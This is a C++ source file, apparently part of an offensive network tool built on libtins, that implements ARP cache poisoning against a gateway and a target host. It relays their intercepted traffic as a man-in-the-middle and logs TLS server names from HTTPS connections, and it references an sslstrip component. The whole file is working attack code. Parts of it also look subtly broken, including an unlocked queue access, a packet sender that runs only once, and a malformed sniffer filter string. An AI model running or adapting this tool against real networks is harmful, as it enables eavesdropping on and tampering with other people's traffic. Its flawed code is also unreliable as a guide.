#include "arpspoof.h"
#include "../sslstrip/ssl.h"
#include <unistd.h>

using IPAddr = const Tins::IPv4Address;
using HWAddr = const Tins::HWAddress<6>;

ArpSpoof::ArpSpoof(const AttackInfo& p) {
    this->sendInfo = SendingInfo(p.iface,p.deviceName);
    this->arpSender = PacketSender(p.iface);    
    this->attInfo = p;    
}
void ArpSpoof::MakeArpReply() {
    auto gwIp = this->attInfo.gwIp;
    auto targetIp = this->attInfo.targetIp;
    auto myhw = this->sendInfo.info.hw_addr;
    this->arpStrm.toGwARP = ARP(gwIp, targetIp, myhw);
    this->arpStrm.toTargetARP = ARP(targetIp, gwIp, myhw);    
}

void ArpSpoof::arpPoisoning() {
    auto toGw = EthernetII(this->attInfo.gwHwAddr, this->sendInfo.iface.hw_address()) / this->arpStrm.toGwARP;
    auto toTarget = EthernetII(this->attInfo.targetHwAddr, this->sendInfo.iface.hw_address())/this->arpStrm.toTargetARP;
    while(true) {
        this->arpSender.send(toGw);
        this->arpSender.send(toTarget);
        sleep(3);
    }    
}

EthernetII crackPacket(const PDU &pdu, IPAddr &hadTogoIP, \
                        HWAddr &hadTogoHw, IPAddr &myIp, HWAddr &myHw) {
    EthernetII newEth = EthernetII(hadTogoHw, myHw) / IP(hadTogoIP, myIp);    
    switch (pdu.find_pdu<IP>()->inner_pdu()->pdu_type()) {
        case PDU::TCP: {
            auto myTcp = pdu.rfind_pdu<TCP>();
            newEth /= myTcp;
            if(myTcp.dport() == 443) {
                TLS t(myTcp.serialize());
                cout << t.handshake.Extensions.server_names() << endl;
            }
            break;
        }
        case PDU::UDP: {
            newEth /= pdu.rfind_pdu<UDP>();
            break;
        }
        default: {
            newEth /= pdu.rfind_pdu<RawPDU>();
            break;
        }
    }
    return newEth;
}

EthernetII ArpSpoof::crackPacketFromGw(const PDU& pdu) {
    return crackPacket(pdu, this->attInfo.targetIp, this->attInfo.targetHwAddr, this->attInfo.myIp, this->sendInfo.info.hw_addr);
}

EthernetII ArpSpoof::crackPacketFromTarget(const PDU& pdu) {
    return crackPacket(pdu, this->attInfo.gwIp, this->attInfo.gwHwAddr, this->attInfo.myIp, this->sendInfo.info.hw_addr);
}

void ArpSpoof::setCrackedPackToGwbuf(const PDU& p) {
    this->arpStrm.mutexLock.lock();
    this->arpStrm.crackedPacketBuf.push(p.rfind_pdu<EthernetII>());
    this->arpStrm.mutexLock.unlock();
}

void ArpSpoof::setCrackedPackToTargetbuf(const PDU& p) {
    this->arpStrm.mutexLock.lock();
    this->arpStrm.crackedPacketBuf.push(p.rfind_pdu<EthernetII>());
    this->arpStrm.mutexLock.unlock();
}

void ArpSpoof::sendCrackedPacket() {
    auto a = &this->arpStrm.crackedPacketBuf.front();
    this->arpStrm.mutexLock.lock();
    this->arpStrm.crackedPacketBuf.pop();
    this->arpStrm.mutexLock.unlock();
    this->arpSender.send(*a);
}

void ArpSpoof::ForwardPacketFromGw() {
    PDU *p = nullptr;
    Packet pk;
    Sniffer sniffer(this->sendInfo.deviceName);
    sniffer.set_filter("ip src"+this->attInfo.gwIp);    
    while (true) {
        pk = sniffer.next_packet();    
        if(!pk.pdu()) continue;
        p = pk.pdu();
        setCrackedPackToTargetbuf(crackPacketFromGw(*p));
    }
}

void ArpSpoof::ForwardPacketFromTarget() {
    PDU *p = nullptr;
    Packet pk;
    Sniffer sniffer(this->sendInfo.deviceName);
    sniffer.set_filter("ip src"+this->attInfo.targetIp);    
    while (true) {
        pk = sniffer.next_packet();    
        if(!pk.pdu()) continue;
        p = pk.pdu();                
        setCrackedPackToGwbuf(crackPacketFromTarget(*p));
    }   
}

void ArpSpoof::run() {
    this->MakeArpReply();
    auto t1 = thread([this]{this->ForwardPacketFromGw();});
    auto t2 = thread([this]{this->ForwardPacketFromTarget();});
    auto t3 = thread([this]{this->sendCrackedPacket();});
    auto t4 = thread([this]{this->arpPoisoning();});
    t1.join();
    t2.join();
    t3.join();
    t4.join();    
}
